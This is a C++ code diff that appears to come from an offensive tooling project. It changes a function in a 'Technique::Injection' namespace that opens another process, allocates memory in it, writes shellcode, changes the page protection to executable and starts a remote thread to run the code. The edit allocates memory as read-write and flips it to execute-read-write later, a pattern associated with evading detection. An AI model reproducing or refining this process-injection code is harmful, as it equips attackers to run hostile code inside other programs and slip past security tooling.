@@ -6,7 +6,10 @@ namespace Technique::Injection
     {
         HANDLE hProcess;
         HANDLE hThread;
-        PVOID remoteBuffer;
+        LPVOID lpRemoteBuffer;
+
+        LPVOID lpBuffer     = (LPVOID)shellcode.data();
+        SIZE_T dwBufferLen  = shellcode.size();
 
         hProcess = System::Process::ProcessOpen(
             pProcs,
@@ -18,14 +21,14 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        remoteBuffer = System::Process::VirtualMemoryAllocate(
+        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
             pProcs,
             hProcess,
-            shellcode.size(),
+            dwBufferLen,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            PAGE_READWRITE
         );
-        if (!remoteBuffer)
+        if (!lpRemoteBuffer)
         {
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
@@ -34,18 +37,27 @@ namespace Technique::Injection
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
-            remoteBuffer,
-            (LPVOID)shellcode.data(),
-            shellcode.size(),
+            lpRemoteBuffer,
+            lpBuffer,
+            dwBufferLen,
             NULL
         )) {
-            System::Process::VirtualMemoryFree(
-                pProcs,
-                hProcess,
-                &remoteBuffer,
-                0,
-                MEM_RELEASE
-            );
+            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        // Set PAGE_EXECUTE_READWRITE protection.
+        DWORD dwOldProtect = PAGE_READWRITE;
+        if (!System::Process::VirtualMemoryProtect(
+            pProcs,
+            hProcess,
+            &lpRemoteBuffer,
+            &dwBufferLen,
+            PAGE_EXECUTE_READWRITE,
+            &dwOldProtect
+        )) {
+            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
@@ -53,18 +65,12 @@ namespace Technique::Injection
         hThread = System::Process::RemoteThreadCreate(
             pProcs,
             hProcess,
-            (LPTHREAD_START_ROUTINE)remoteBuffer,
+            (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
             NULL
         );
         if (!hThread)
         {
-            System::Process::VirtualMemoryFree(
-                pProcs,
-                hProcess,
-                &remoteBuffer,
-                0,
-                MEM_RELEASE
-            );
+            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
